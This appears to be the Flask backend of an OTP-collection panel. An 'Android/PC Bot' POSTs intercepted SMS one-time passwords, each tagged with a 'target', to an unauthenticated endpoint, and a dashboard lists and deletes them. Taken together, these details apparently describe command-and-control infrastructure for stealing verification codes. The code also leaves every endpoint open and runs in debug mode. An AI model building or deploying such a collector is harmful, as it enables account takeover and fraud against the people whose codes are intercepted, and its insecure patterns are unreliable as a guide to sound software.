from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os

app = Flask(__name__)

# Database Configuration
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Database Model
class OTP(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    target = db.Column(db.String(20), nullable=False)
    sender = db.Column(db.String(50), nullable=False)
    message = db.Column(db.Text, nullable=False)
    timestamp = db.Column(db.String(50), default=lambda: datetime.now().strftime("%I:%M:%S %p"))

with app.app_context():
    db.create_all()

@app.route('/')
def index():
    return render_template('index.html')

# API to receive OTP from Android/PC Bot
@app.route('/api/receive', methods=['POST'])
def receive_otp():
    data = request.json
    new_otp = OTP(target=data.get('target'), sender=data.get('sender'), message=data.get('message'))
    db.session.add(new_otp)
    db.session.commit()
    return jsonify({"status": "success"}), 200

# API to get all OTPs for Dashboard
@app.route('/api/get_otps', methods=['GET'])
def get_otps():
    otps = OTP.query.order_by(OTP.id.desc()).all()
    output = []
    for otp in otps:
        output.append({
            "id": otp.id,
            "target": otp.target,
            "sender": otp.sender,
            "message": otp.message,
            "timestamp": otp.timestamp
        })
    return jsonify(output)

# API to delete single OTP
@app.route('/api/delete/<int:id>', methods=['DELETE'])
def delete_otp(id):
    otp = OTP.query.get(id)
    if otp:
        db.session.delete(otp)
        db.session.commit()
        return jsonify({"status": "deleted"}), 200
    return jsonify({"status": "not found"}), 404

# API to delete all OTPs
@app.route('/api/delete_all', methods=['DELETE'])
def delete_all():
    db.session.query(OTP).delete()
    db.session.commit()
    return jsonify({"status": "all deleted"}), 200

if __name__ == '__main__':
    app.run(debug=True)
